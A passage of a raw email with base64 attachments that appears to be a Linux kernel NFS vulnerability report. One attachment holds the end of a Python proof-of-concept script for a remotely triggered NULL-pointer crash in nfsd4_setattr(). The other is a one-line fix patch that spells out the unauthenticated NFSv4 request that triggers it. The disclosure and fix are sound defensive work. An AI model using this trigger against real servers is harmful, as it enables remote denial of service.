IGVsc2U6CiAgICAgICAgICAgIHZlcmRpY3QgPSBmIls/XSAge291dGNvbWV9IgogICAgICAgIHBy
aW50KGYiICB7dmFyaWFudDo8MjB9ICB7dmVyZGljdH0iKQogICAgcHJpbnQoIuKVkCIgKiA2MCkK
ICAgIHByaW50KCkKICAgIHByaW50KCIgIElmIGNvbm5lY3Rpb24gcmVzZXRzOiBjaGVjayBkbWVz
ZyBvbiB0aGUgc2VydmVyIGZvcjoiKQogICAgcHJpbnQoIiAgQlVHOiBrZXJuZWwgTlVMTCBwb2lu
dGVyIGRlcmVmZXJlbmNlLCBhZGRyZXNzOiAweDAwMDAwMDA0IikKICAgIHByaW50KCIgIFJJUDog
bmZzZDRfc2V0YXR0cisuLi4gKGZzL25mc2QvbmZzNHByb2MuYzoxMjUzKSIpCiAgICBwcmludCgp
CiAgICBwcmludCgiICBQYXRjaDogYWRkICdzdCAmJicgZ3VhcmQgYmVmb3JlIHN0LT5zY190eXBl
IGRlcmVmZXJlbmNlIGluIikKICAgIHByaW50KCIgIG5mc2Q0X3NldGF0dHIoKSAoZnMvbmZzZC9u
ZnM0cHJvYy5jIGxpbmUgfjEyNTMpIikKCgpkZWYgbWFpbigpOgogICAgcCA9IGFyZ3BhcnNlLkFy
Z3VtZW50UGFyc2VyKAogICAgICAgIGRlc2NyaXB0aW9uPSJQb0M6IE5VTEwgcHRyIGRlcmVmIGlu
IG5mc2Q0X3NldGF0dHIoKSB2aWEgVElNRV9ERUxFR19BQ0NFU1MiKQogICAgcC5hZGRfYXJndW1l
bnQoIi0tc2VydmVyIiwgZGVmYXVsdD0iMTI3LjAuMC4xIiwgaGVscD0iTkZTIHNlcnZlciBhZGRy
ZXNzIikKICAgIHAuYWRkX2FyZ3VtZW50KCItLXBvcnQiLCB0eXBlPWludCwgZGVmYXVsdD0yMDQ5
LCBoZWxwPSJORlMgcG9ydCIpCiAgICBwLmFkZF9hcmd1bWVudCgiLS12ZXJib3NlIiwgIi12Iiwg
YWN0aW9uPSJzdG9yZV90cnVlIikKICAgIGFyZ3MgPSBwLnBhcnNlX2FyZ3MoKQoKICAgIHRyeToK
ICAgICAgICBydW5fYXR0YWNrKGFyZ3Muc2VydmVyLCBhcmdzLnBvcnQsIGFyZ3MudmVyYm9zZSkK
ICAgIGV4Y2VwdCBDb25uZWN0aW9uUmVmdXNlZEVycm9yOgogICAgICAgIHByaW50KGYiWyFdIENv
bm5lY3Rpb24gcmVmdXNlZCDigJQgaXMgdGhlIE5GUyBzZXJ2ZXIgcnVubmluZz8iLCBmaWxlPXN5
cy5zdGRlcnIpCiAgICAgICAgcHJpbnQoZiIgICAgU3RhcnQgUUVNVSBWTSB3aXRoOiBiYXNoIHFl
bXUvcnVuX3ZtLnNoIiwgZmlsZT1zeXMuc3RkZXJyKQogICAgICAgIHN5cy5leGl0KDEpCgoKaWYg
X19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=
--000000000000cf8723065412c631
Content-Type: application/octet-stream; 
	name="fix-nfsd-setattr-null-deref.patch"
Content-Disposition: attachment; 
	filename="fix-nfsd-setattr-null-deref.patch"
Content-Transfer-Encoding: base64
Content-ID: <f_mqb9kytx1>
X-Attachment-Id: f_mqb9kytx1

RnJvbTogRklYTUVfQVVUSE9SX05BTUUgPEZJWE1FX0FVVEhPUl9FTUFJTD4KRGF0ZTogVGh1LCAx
MiBKdW4gMjAyNiAwMDowMDowMCArMDAwMApTdWJqZWN0OiBbUEFUQ0hdIG5mc2Q6IGZpeCBudWxs
IGRlcmVmZXJlbmNlIGluIG5mc2Q0X3NldGF0dHIgZm9yIGRlbGVnIHRpbWVzdGFtcCBhdHRycwoK
V2hlbiBhIFNFVEFUVFIgcmVxdWVzdCBpbmNsdWRlcyBGQVRUUjRfV09SRDJfVElNRV9ERUxFR19B
Q0NFU1Mgb3IKRkFUVFI0X1dPUkQyX1RJTUVfREVMRUdfTU9ESUZZIGluIHRoZSBhdHRyaWJ1dGUg
Yml0bWFwLCBuZnNkNF9zZXRhdHRyKCkKc2V0cyBkZWxlZ19hdHRycz10cnVlIGFuZCBjYWxscyBu
ZnM0X3ByZXByb2Nlc3Nfc3RhdGVpZF9vcCgpIHRvIHZhbGlkYXRlCnRoZSBzdGF0ZWlkLgoKSWYg
dGhlIGNsaWVudCBzdXBwbGllcyB0aGUgTkZTdjQgIm9uZSBzdGF0ZWlkIiAoYWxsLTB4RkYgYnl0
ZXMpLApjaGVja19zcGVjaWFsX3N0YXRlaWRzKCkgcmV0dXJucyBuZnNfb2sgd2l0aG91dCBwb3B1
bGF0aW5nIHRoZSBvdXRwdXQKbmZzNF9zdGlkIHBvaW50ZXIsIGJlY2F1c2UgdGhlIHNwZWNpYWwt
c3RhdGVpZCBwYXRoIGluCm5mczRfcHJlcHJvY2Vzc19zdGF0ZWlkX29wKCkganVtcHMgdG8gZG9u
ZTogd2l0aCBzPT1OVUxMLCBhbmQgdGhlCiJpZiAocykiIGJsb2NrIHRoYXQgd291bGQgc2V0ICpj
c3RpZCBpcyBza2lwcGVkLiBUaGUgbG9jYWwgdmFyaWFibGUgYHN0YApyZW1haW5zIE5VTEwuCgpC
YWNrIGluIG5mc2Q0X3NldGF0dHIoKSwgdGhlIGlmIChkZWxlZ19hdHRycykgYmxvY2sgdGhlbiB1
bmNvbmRpdGlvbmFsbHkKZGVyZWZlcmVuY2VzIHN0LT5zY190eXBlIChhdCBvZmZzZXQgNCBmcm9t
IE5VTEwpLCBjYXVzaW5nIGEga2VybmVsIG9vcHMuCgpUaGlzIGlzIHJlbW90ZWx5IHRyaWdnZXJh
YmxlIGJ5IGFueSBORlN2NCBjbGllbnQ6IHNlbmQgQ09NUE9VTkQgW1BVVFJPT1RGSCwKU0VUQVRU
UihPTkVfU1RBVEVJRCwge2JtdmFsMj1GQVRUUjRfV09SRDJfVElNRV9ERUxFR19BQ0NFU1MsIC4u
Ln0pXS4KTm8gYXV0aGVudGljYXRpb24sIGRlbGVnYXRpb24sIG9yIHByaW9yIHN0YXRlIGlzIHJl
cXVpcmVkLgoKRml4IGJ5IGFkZGluZyBhIE5VTEwgY2hlY2sgYmVmb3JlIHRoZSBkZXJlZmVyZW5j
ZS4gQSBzcGVjaWFsIHN0YXRlaWQgaXMKbm90IGEgZGVsZWdhdGlvbiBzdGF0ZWlkLCBzbyB0aGUg
ZXhpc3RpbmcgbmZzZXJyX2JhZF9zdGF0ZWlkIHJldHVybiB2YWx1ZQppcyBhbHJlYWR5IGNvcnJl
Y3Q7IHdlIG9ubHkgbmVlZCB0byBndWFyZCB0aGUgcG9pbnRlciBkZXJlZmVyZW5jZSBpdHNlbGYu
CgpGaXhlczogN2UxM2Y0ZjhkMjdkYzAyZmI4ODY2NmY2MDNjNTNjYTc0OWQ1NmY5MiAoIm5mc2Q6
IGhhbmRsZSBkZWxlZ2F0ZWQgdGltZXN0YW1wcyBpbiBTRVRBVFRSIikKQ2M6IHN0YWJsZUB2Z2Vy
Lmtlcm5lbC5vcmcKU2lnbmVkLW9mZi1ieTogRklYTUVfQVVUSE9SX05BTUUgPEZJWE1FX0FVVEhP
Ul9FTUFJTD4KLS0tCiBmcy9uZnNkL25mczRwcm9jLmMgfCAyICstCiAxIGZpbGUgY2hhbmdlZCwg
MSBpbnNlcnRpb24oKyksIDEgZGVsZXRpb24oLSkKCmRpZmYgLS1naXQgYS9mcy9uZnNkL25mczRw
cm9jLmMgYi9mcy9uZnNkL25mczRwcm9jLmMKaW5kZXggYWFjZDkxMmE1ZmJlLi5GSVhNRV9ORVdf
SEFTSCAxMDA2NDQKLS0tIGEvZnMvbmZzZC9uZnM0cHJvYy5jCisrKyBiL2ZzL25mc2QvbmZzNHBy
b2MuYwpAQCAtMTI1MSw3ICsxMjUxLDcgQEAgbmZzZDRfc2V0YXR0cihzdHJ1Y3Qgc3ZjX3Jxc3Qg
KnJxc3RwLCBzdHJ1Y3QgbmZzZDRfY29tcG91bmRfc3RhdGUgKmNzdGF0ZSwKIAlpZiAoZGVsZWdf
YXR0cnMpIHsKIAkJc3RhdHVzID0gbmZzZXJyX2JhZF9zdGF0ZWlkOwotCQlpZiAoc3QtPnNjX3R5
cGUgJiBTQ19UWVBFX0RFTEVHKSB7CisJCWlmIChzdCAmJiAoc3QtPnNjX3R5cGUgJiBTQ19UWVBF
X0RFTEVHKSkgewogCQkJc3RydWN0IG5mczRfZGVsZWdhdGlvbiAqZHAgPSBkZWxlZ3N0YXRlaWQo
c3QpOwoKIAkJCS8qIE9ubHkgZm9yICpfQVRUUlNfREVMRUcgZmxhdm9ycyAqLwotLQoyLjM5LjAK
--000000000000cf8723065412c631--

